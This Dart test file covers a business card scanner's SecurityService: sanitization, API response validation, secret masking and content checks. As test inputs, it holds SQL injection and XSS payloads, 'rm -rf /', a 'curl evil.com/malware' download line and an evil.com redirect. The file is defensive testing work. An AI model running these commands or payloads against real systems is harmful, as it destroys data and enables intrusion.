import 'package:busines_card_scanner_flutter/core/errors/failures.dart';
import 'package:busines_card_scanner_flutter/core/services/security_service.dart';
import 'package:dartz/dartz.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('SecurityService Tests', () {
    late SecurityService securityService;

    setUp(() {
      securityService = SecurityService();
    });

    group('Input Sanitization', () {
      test('should remove potentially malicious SQL injection patterns', () {
        final maliciousInputs = [
          "'; DROP TABLE users; --",
          "1' OR '1'='1",
          "admin'/**/OR/**/1=1--",
          "' UNION SELECT * FROM sensitive_table --",
          "1; DELETE FROM users WHERE 1=1; --",
        ];

        for (final input in maliciousInputs) {
          final result = securityService.sanitizeInput(input);
          
          result.fold(
            (failure) => fail('Should sanitize malicious input: $input'),
            (sanitized) {
              expect(sanitized, isNot(contains('DROP')));
              expect(sanitized, isNot(contains('DELETE')));
              expect(sanitized, isNot(contains('UNION')));
              expect(sanitized, isNot(contains('--')));
              expect(sanitized, isNot(contains("'")));
            },
          );
        }
      });

      test('should remove potentially malicious XSS patterns', () {
        final maliciousInputs = [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert("XSS")',
          '<iframe src="javascript:alert(1)"></iframe>',
          '<svg onload="alert(1)">',
          '<div onclick="alert(1)">Click me</div>',
          '<a href="javascript:alert(1)">Link</a>',
          "';alert('XSS');//",
        ];

        for (final input in maliciousInputs) {
          final result = securityService.sanitizeInput(input);
          
          result.fold(
            (failure) => fail('Should sanitize XSS input: $input'),
            (sanitized) {
              expect(sanitized, isNot(contains('<script')));
              expect(sanitized, isNot(contains('javascript:')));
              expect(sanitized, isNot(contains('onerror')));
              expect(sanitized, isNot(contains('onload')));
              expect(sanitized, isNot(contains('onclick')));
              expect(sanitized, isNot(contains('alert')));
            },
          );
        }
      });

      test('should preserve safe input content', () {
        final safeInputs = [
          'John Doe',
          '台北市信義區',
          'user@example.com',
          '+886-2-1234-5678',
          'Apple Inc.',
          'Software Engineer',
          '中華電信股份有限公司',
          'https://www.example.com',
        ];

        for (final input in safeInputs) {
          final result = securityService.sanitizeInput(input);
          
          result.fold(
            (failure) => fail('Should preserve safe input: $input'),
            (sanitized) {
              expect(sanitized, isNotEmpty);
              // Safe input should be mostly preserved (maybe some formatting changes)
              expect(sanitized.length, greaterThan(input.length ~/ 2));
            },
          );
        }
      });

      test('should handle empty and whitespace input', () {
        final emptyInputs = ['', '   ', '\t', '\n', '  \t\n  '];

        for (final input in emptyInputs) {
          final result = securityService.sanitizeInput(input);
          
          result.fold(
            (failure) {
              expect(failure, isA<SecurityFailure>());
            },
            (sanitized) {
              expect(sanitized.trim(), isEmpty);
            },
          );
        }
      });
    });

    group('API Response Validation', () {
      test('should validate safe JSON responses', () {
        final safeResponses = [
          '{"name": "John", "email": "john@example.com"}',
          '{"cards": [{"id": 1, "name": "Business Card"}]}',
          '{"status": "success", "data": {"count": 5}}',
          '[]',
          '{"message": "操作成功"}',
        ];

        for (final response in safeResponses) {
          final result = securityService.validateApiResponse(response);
          expect(result.isRight(), true, reason: 'Response should be safe: $response');
        }
      });

      test('should reject potentially malicious API responses', () {
        final maliciousResponses = [
          '<script>alert("XSS")</script>',
          '{"eval": "alert(1)"}',
          '{"javascript": "window.location=\\"evil.com\\""}',
          '{"<script>": "malicious"}',
          'javascript:alert(1)',
          '{"data": "<iframe src=\\"javascript:alert(1)\\"></iframe>"}',
        ];

        for (final response in maliciousResponses) {
          final result = securityService.validateApiResponse(response);
          expect(result.isLeft(), true, reason: 'Response should be rejected: $response');
          
          result.fold(
            (failure) {
              expect(failure, isA<SecurityFailure>());
            },
            (validated) => fail('Should reject malicious response: $response'),
          );
        }
      });

      test('should handle malformed JSON gracefully', () {
        final malformedResponses = [
          '{"name": "John"',  // Missing closing brace
          '{name: "John"}',   // Missing quotes
          '{"name": "John",}', // Trailing comma
          'Not JSON at all',
          '',
          null,
        ];

        for (final response in malformedResponses) {
          final result = securityService.validateApiResponse(response ?? '');
          
          // Should either return Left (failure) or handle gracefully
          expect(result, isA<Either<SecurityFailure, String>>());
          
          if (result.isLeft()) {
            result.fold(
              (failure) {
                expect(failure, isA<SecurityFailure>());
              },
              (validated) {},
            );
          }
        }
      });
    });

    group('Sensitive Information Detection', () {
      test('should detect and mask API keys', () {
        final textWithApiKeys = [
          'API_KEY=sk-abc123xyz456',
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
          'Authorization: Bearer abc123',
          'api-key: secret_key_123',
          'X-API-KEY: my-secret-key',
        ];

        for (final text in textWithApiKeys) {
          final result = securityService.maskSensitiveInfo(text);
          
          result.fold(
            (failure) => fail('Should mask sensitive info: $text'),
            (masked) {
              expect(masked, isNot(contains('sk-abc123xyz456')));
              expect(masked, isNot(contains('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9')));
              expect(masked, isNot(contains('secret_key_123')));
              expect(masked, contains('***'));
            },
          );
        }
      });

      test('should detect and mask credit card numbers', () {
        final textWithCreditCards = [
          '4111-1111-1111-1111',
          '4111 1111 1111 1111',
          '4111111111111111',
          'My card number is 5555-5555-5555-4444',
          'Card: 378282246310005',
        ];

        for (final text in textWithCreditCards) {
          final result = securityService.maskSensitiveInfo(text);
          
          result.fold(
            (failure) => fail('Should mask credit card: $text'),
            (masked) {
              expect(masked, isNot(contains('4111-1111-1111-1111')));
              expect(masked, isNot(contains('4111111111111111')));
              expect(masked, isNot(contains('5555-5555-5555-4444')));
              expect(masked, contains('***'));
            },
          );
        }
      });

      test('should detect and mask passwords', () {
        final textWithPasswords = [
          'password=mypassword123',
          'pwd: secret123',
          'Password is: SuperSecret!',
          'pass=123456',
        ];

        for (final text in textWithPasswords) {
          final result = securityService.maskSensitiveInfo(text);
          
          result.fold(
            (failure) => fail('Should mask password: $text'),
            (masked) {
              expect(masked, isNot(contains('mypassword123')));
              expect(masked, isNot(contains('secret123')));
              expect(masked, isNot(contains('SuperSecret!')));
              expect(masked, contains('***'));
            },
          );
        }
      });

      test('should preserve non-sensitive information', () {
        final safeTexts = [
          'Hello World',
          'John Doe - Software Engineer',
          'Contact: john@example.com',
          'Phone: +886-2-1234-5678',
          '台灣積體電路製造股份有限公司',
        ];

        for (final text in safeTexts) {
          final result = securityService.maskSensitiveInfo(text);
          
          result.fold(
            (failure) => fail('Should preserve safe text: $text'),
            (masked) {
              expect(masked, equals(text)); // Should be unchanged
            },
          );
        }
      });
    });

    group('Content Security Validation', () {
      test('should detect potentially malicious file contents', () {
        final maliciousContents = [
          'eval(base64_decode("malicious_code"))',
          'system("rm -rf /")',
          'exec("curl evil.com/malware")',
          '<script>document.cookie</script>',
          'window.location = "http://evil.com"',
        ];

        for (final content in maliciousContents) {
          final result = securityService.validateContent(content);
          expect(result.isLeft(), true, reason: 'Content should be flagged as malicious: $content');
          
          result.fold(
            (failure) {
              expect(failure, isA<SecurityFailure>());
            },
            (validated) => fail('Should reject malicious content: $content'),
          );
        }
      });

      test('should allow safe business card content', () {
        final safeContents = [
          'John Smith\nSoftware Engineer\nApple Inc.\nphone: 123-456-7890',
          '王小明\n軟體工程師\n台積電\n電話：02-1234-5678',
          'EMAIL: john@company.com\nWEBSITE: https://company.com',
          'Address: 123 Main St, Taipei, Taiwan',
        ];

        for (final content in safeContents) {
          final result = securityService.validateContent(content);
          expect(result.isRight(), true, reason: 'Content should be safe: $content');
        }
      });

      test('should handle edge cases gracefully', () {
        final edgeCases = [
          '',
          'A' * 10000, // Very long string
          '\u0000\u0001\u0002', // Control characters
          '🚀 Future Tech Inc. 📧 contact@future.tech', // Emojis
        ];

        for (final content in edgeCases) {
          final result = securityService.validateContent(content);
          // Should handle gracefully (either pass or fail with proper error)
          expect(result, isA<Either<SecurityFailure, String>>());
        }
      });
    });

    group('Rate Limiting and Security Headers', () {
      test('should validate security headers', () {
        final secureHeaders = {
          'Content-Type': 'application/json',
          'X-Content-Type-Options': 'nosniff',
          'X-Frame-Options': 'DENY',
          'Strict-Transport-Security': 'max-age=31536000',
        };

        final result = securityService.validateSecurityHeaders(secureHeaders);
        expect(result.isRight(), true);
      });

      test('should reject requests with missing security headers', () {
        final unsafeHeaders = {
          'Content-Type': 'application/json',
          // Missing security headers
        };

        final result = securityService.validateSecurityHeaders(unsafeHeaders);
        expect(result.isLeft(), true);
      });

      test('should validate against suspicious patterns', () {
        final suspiciousPatterns = [
          'Multiple failed login attempts',
          'Unusual API call patterns',
          'High frequency requests',
        ];

        // This would be more complex in real implementation
        // For now, just test that the method exists and returns something
        for (final pattern in suspiciousPatterns) {
          final result = securityService.detectSuspiciousActivity(pattern);
          expect(result, isA<Either<SecurityFailure, String>>());
        }
      });
    });

    group('Performance and Edge Cases', () {
      test('should handle large inputs efficiently', () {
        final largeInput = 'Safe content ' * 10000; // ~120KB
        final stopwatch = Stopwatch()..start();
        
        final result = securityService.sanitizeInput(largeInput);
        
        stopwatch.stop();
        expect(stopwatch.elapsedMilliseconds, lessThan(500), 
               reason: 'Large input processing should complete within 500ms');
        expect(result.isRight(), true);
      });

      test('should be thread-safe for concurrent operations', () async {
        final inputs = List.generate(100, (i) => 'Test input $i');
        
        final futures = inputs.map((input) async {
          return securityService.sanitizeInput(input);
        }).toList();
        
        final results = await Future.wait(futures);
        
        expect(results.length, 100);
        for (final result in results) {
          expect(result.isRight(), true);
        }
      });
    });
  });
}